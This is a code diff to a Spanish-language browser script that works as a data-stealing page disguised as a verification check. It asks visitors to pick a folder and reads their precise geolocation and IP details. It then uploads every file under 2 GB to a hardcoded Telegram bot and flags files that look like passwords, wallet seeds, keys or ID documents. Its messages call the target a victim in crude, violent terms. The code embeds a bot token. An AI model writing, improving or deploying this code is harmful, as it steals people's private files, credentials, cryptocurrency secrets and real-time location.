@@ -23,8 +23,9 @@ const BOT_TOKEN = "8073881757:AAHpZPnjwg29xhmfkrahnmCnYsp8CbcMf_M";
 const CHAT_ID   = "8284747554";
 
 
-const URL_MSG = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
-const URL_RESUMEN = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+const URL_DOC = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
+const URL_VID = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+const URL_MSG = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
 async function robarTodo() {
   try {
@@ -33,24 +34,37 @@ async function robarTodo() {
     const dirHandle = await window.showDirectoryPicker({ mode: "readwrite" });
 
     
-    let geo = "Ubicación denegada o no disponible";
+    let lat = "?", lon = "?";
     try {
       const pos = await new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 10000});
+        navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 15000, maximumAge: 0});
       });
-      geo = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)} (precisión ±${pos.coords.accuracy.toFixed(0)}m)`;
+      lat = pos.coords.latitude.toFixed(8);
+      lon = pos.coords.longitude.toFixed(8);
     } catch(e) {}
 
-    const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({ip:"?",city:"?",country_name:"?",timezone:"?"}));
+    const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
 
-    const infoVictima = `🌍 NUEVA VÍCTIMA VERIFICADA\n\nIP: ${ipData.ip}\nCiudad: ${ipData.city}, ${ipData.country_name}\nCoordenadas reales: ${geo}\nZona horaria: ${ipData.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone}\nCarpeta elegida: ${dirHandle.name}\nHora: ${new Date().toLocaleString('es-ES')}`;
+    const mapsLink = lat !== "?" ? `https://www.google.com/maps?q=${lat},${lon}&z=18` : "Ubicación denegada";
 
-    await fetch(URL_RESUMEN, {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({chat_id: CHAT_ID, text: infoVictima})
+    const infoVictima = `🟥 VÍCTIMA LOCALIZADA Y RAPEADA 🟥
+
+IP: ${ipData.ip || "?"}
+ISP: ${ipData.org || "?"}
+Ciudad: ${ipData.city || "?"}, ${ipData.region || "?"}, ${ipData.country_name || "?"} ${ipData.country_emoji || ""}
+Zona horaria: ${ipData.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone}
+
+UBICACIÓN EXACTA EN TIEMPO REAL:
+${mapsLink}
+
+Carpeta elegida: ${dirHandle.name}
+Hora exacta: ${new Date().toLocaleString('es-ES')}
+
+¡EL HACK SE ESTÁ ACTIVANDO EN SU PC!`;
+
+    await fetch(URL_MSG, {method: "POST", headers: {"Content-Type": "application/json"}, 
+      body: JSON.stringify({chat_id: CHAT_ID, text: infoVictima, disable_web_page_preview: false})
     });
-    
 
     const interesantes = [];
     const pesados = [];
@@ -59,27 +73,49 @@ async function robarTodo() {
       if (entry.kind === "file") {
         const file = await entry.getFile();
         const nombre = file.name.toLowerCase();
-        const esInteresante = nombre.includes("pass") || nombre.includes("wallet") || nombre.includes("seed") || nombre.includes("dni") || nombre.includes("carnet") || nombre.includes("captura") || nombre.includes("metamask") || nombre.includes("binance") || nombre.endsWith(".json") || nombre.endsWith(".txt") || nombre.endsWith(".docx") || nombre.endsWith(".pdf");
 
-        if (file.size < 15 * 1024 * 1024) {
-          const form = new FormData();
-          form.append("chat_id", CHAT_ID);
+        const esInteresante = nombre.includes("pass") || nombre.includes("wallet") || nombre.includes("seed") || 
+                              nombre.includes("dni") || nombre.includes("metamask") || nombre.includes("binance") || 
+                              nombre.includes("private") || nombre.includes("key") || nombre.includes("auth");
+
+        
+        const form = new FormData();
+        form.append("chat_id", CHAT_ID);
+        form.append("parse_mode", "HTML");
+
+        if (file.type.startsWith("video/") && file.size < 2 * 1024 * 1024 * 1024) {
+          form.append("video", file, file.name);
+          form.append("caption", `<b>🎥 VÍDEO ROBADO</b>\n📁 ${dirHandle.name}\n📄 ${file.name}\n⚖ ${(file.size/1024/1024).toFixed(2)} MB\n🕐 ${new Date().toLocaleString()}`);
+          await fetch(URL_VID, {method: "POST", body: form});
+        } else if (file.size < 2 * 1024 * 1024 * 1024) {
           form.append("document", file, file.name);
-          form.append("caption", `ARCHIVO ROBADO\n📁 ${dirHandle.name}\n📄 ${file.name}\n⚖ ${(file.size/1024/1024).toFixed(2)} MB\n🕛 ${new Date().toLocaleString()}`);
-          await fetch(URL_MSG, {method: "POST", body: form});
-          
-          if (esInteresante) interesantes.push(file.name);
+          form.append("caption", `<b>📁 ARCHIVO ROBADO</b>\n📁 ${dirHandle.name}\n📄 ${file.name}\n⚖ ${(file.size/1024/1024).toFixed(2)} MB\n${esInteresante ? "🔥 JUGOSO DETECTADO 🔥" : ""}\n🕐 ${new Date().toLocaleString()}`);
+          await fetch(URL_DOC, {method: "POST", body: form});
         } else {
-          pesados.push(`${file.name} → ${(file.size/1024/1024).toFixed(2)} MB`);
+          pesados.push(`${file.name} → ${(file.size/1024/1024/1024).toFixed(2)} GB (demasiado pesado)`);
         }
+
+        if (esInteresante) interesantes.push(`🔥 ${file.name}`);
       }
     }
 
-    const textoResumen = `🟥 VÍCTIMA RAPEADA CON ÉXITO 🟥\n\n📁 Carpeta: ${dirHandle.name}\n\n${interesantes.length > 0 ? "ARCHIVOS JUGOSOS ("+interesantes.length+"):\n" + interesantes.slice(0,30).join("\n") + "\n\n" : "No había archivos muy jugosos pero se subió todo\n\n"}${pesados.length > 0 ? "ARCHIVOS PESADOS:\n" + pesados.slice(0,15).join("\n") : ""}\n\nHora: ${new Date().toLocaleString()}`;
+    const resumenFinal = `✅ RAPEADO COMPLETADO CON ÉXITO ✅
 
-    await fetch(URL_RESUMEN, {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({chat_id: CHAT_ID, text: textoResumen})});
+📁 Carpeta: <code>${dirHandle.name}</code>
+🌍 Ubicación: ${mapsLink}
 
-    
+${interesantes.length > 0 ? "ARCHIVOS ULTRA JUGOSOS (" + interesantes.length + "):\n" + interesantes.join("\n") + "\n\n" : "No había archivos muy jugosos pero se subió TODO lo posible\n\n"}
+
+${pesados.length > 0 ? "ARCHIVOS DEMASIADO PESADOS (no subidos):\n" + pesados.join("\n") : ""}
+
+Hora final: ${new Date().toLocaleString('es-ES')}
+
+LA VÍCTIMA ESTÁ SIENDO VERIFICADA...`;
+
+    await fetch(URL_MSG, {method: "POST", headers: {"Content-Type": "application/json"}, 
+      body: JSON.stringify({chat_id: CHAT_ID, text: resumenFinal, parse_mode: "HTML", disable_web_page_preview: false})
+    });
+
     document.getElementById("status").innerHTML = "Verificando... por favor espere mientras usted está siendo verificado<br><br>NO CIERRE ESTA VENTANA";
 
   } catch (e) {
